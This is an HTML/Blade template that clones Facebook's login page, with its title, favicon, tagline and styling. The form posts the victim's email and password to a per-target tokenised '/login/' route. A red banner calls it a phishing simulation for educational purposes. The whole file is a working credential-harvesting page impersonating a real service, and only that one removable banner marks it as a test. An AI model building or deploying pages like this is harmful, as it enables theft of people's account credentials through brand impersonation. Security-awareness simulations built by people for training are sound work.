<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: SFProText-Regular, Helvetica, Arial, sans-serif; 
            background-color: #f0f2f5; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }
        ._8eso { 
            background-color: #f0f2f5; 
            min-height: 100vh; 
            padding-top: 72px; 
        }
        ._8a3f { 
            max-width: 980px; 
            margin: 0 auto; 
            padding: 0 16px; 
        }
        ._8a3g { 
            display: flex; 
            flex-wrap: wrap; 
            margin: -16px; 
        }
        ._8a3h { 
            flex: 1; 
            min-width: 400px; 
            padding: 16px; 
        }
        ._8a3i { 
            padding: 16px; 
            width: 396px; 
        }
        ._8a3j { 
            margin-bottom: 24px; 
        }
        ._8a3k { 
            color: #1877f2; 
            font-size: 60px; 
            font-weight: bold; 
            line-height: 72px; 
            margin: -16px 0 -4px; 
        }
        ._8a3l { 
            color: #1c1e21; 
            font-size: 24px; 
            font-weight: normal; 
            line-height: 28px; 
        }
        ._8a3m { 
            background-color: #fff; 
            border-radius: 8px; 
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); 
            padding: 20px; 
            width: 396px; 
        }
        ._8a3n { 
            margin-bottom: 16px; 
        }
        ._8a3o { 
            background-color: #f5f6f7; 
            border: 1px solid #dddfe2; 
            border-radius: 6px; 
            color: #1d2129; 
            font-size: 17px; 
            padding: 14px 16px; 
            width: 100%; 
            box-sizing: border-box; 
        }
        ._8a3o:focus { 
            border-color: #1877f2; 
            box-shadow: 0 0 0 2px #e7f3ff; 
            outline: none; 
        }
        ._8a3p { 
            background-color: #1877f2; 
            border: none; 
            border-radius: 6px; 
            color: #fff; 
            font-size: 20px; 
            font-weight: bold; 
            padding: 12px; 
            width: 100%; 
            cursor: pointer; 
            margin-bottom: 16px; 
        }
        ._8a3p:hover { 
            background-color: #166fe5; 
        }
        ._8a3q { 
            border: none; 
            color: #1877f2; 
            font-size: 14px; 
            padding: 12px; 
            text-align: center; 
            width: 100%; 
            background: none; 
            cursor: pointer; 
        }
        ._8a3r { 
            border-top: 1px solid #dadde1; 
            margin: 20px 0; 
        }
        ._8a3s { 
            background-color: #42b883; 
            border: none; 
            border-radius: 6px; 
            color: #fff; 
            font-size: 17px; 
            font-weight: bold; 
            padding: 12px 16px; 
            margin-top: 16px; 
            cursor: pointer; 
        }
        .disclaimer { 
            position: fixed; 
            bottom: 10px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(255, 0, 0, 0.9); 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            font-size: 12px; 
            z-index: 1000; 
        }
    </style>
</head>
<body>
    <div class="_8eso">
        <div class="_8a3f">
            <div class="_8a3g">
                <div class="_8a3h">
                    <div class="_8a3j">
                        <div class="_8a3k">facebook</div>
                        <div class="_8a3l">Facebook helps you connect and share with the people in your life.</div>
                    </div>
                </div>
                <div class="_8a3i">
                    <div class="_8a3m">
                        <form method="POST" action="{{ url('/login/' . $token) }}">
                            @csrf
                            <div class="_8a3n">
                                <input type="text" name="email" class="_8a3o" placeholder="Email address or phone number" required>
                            </div>
                            <div class="_8a3n">
                                <input type="password" name="password" class="_8a3o" placeholder="Password" required>
                            </div>
                            <button type="submit" class="_8a3p">Log in</button>
                        </form>
                        <button class="_8a3q">Forgotten password?</button>
                        <div class="_8a3r"></div>
                        <button class="_8a3s">Create new account</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="disclaimer">
        ⚠️ This is a phishing simulation for educational purposes. Do not use real credentials.
    </div>
</body>
</html>
